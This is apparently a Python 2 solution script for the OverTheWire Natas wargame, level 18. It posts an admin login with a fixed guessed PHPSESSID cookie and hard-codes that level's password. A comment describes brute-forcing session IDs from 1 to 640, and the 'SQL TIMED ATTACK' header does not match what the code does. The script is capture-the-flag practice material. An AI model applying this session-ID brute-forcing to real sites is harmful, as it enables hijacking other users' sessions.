#!/usr/bin/env python
# SQL TIMED ATTACK
import requests
import re
from string import *
from time import *

characters = lowercase + uppercase + digits	
	
username='natas18'
password='xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'

url = 'http://%s.natas.labs.overthewire.org/' %username
path = '/?debug=true'
session = requests.session()

response = session.post(url, auth=(username, password), data={'username':'admin', 'password':'pass'}, cookies={'PHPSESSID':'119'})
content = response.text

print content


# From the source code it was seen that PHPSESSID is required to get the credentials of next level. But to get the correct PHPSESSID we ran a loop from 1 to max variable 640 to find that value. Once, that value was determined, it was sent through the cookies.
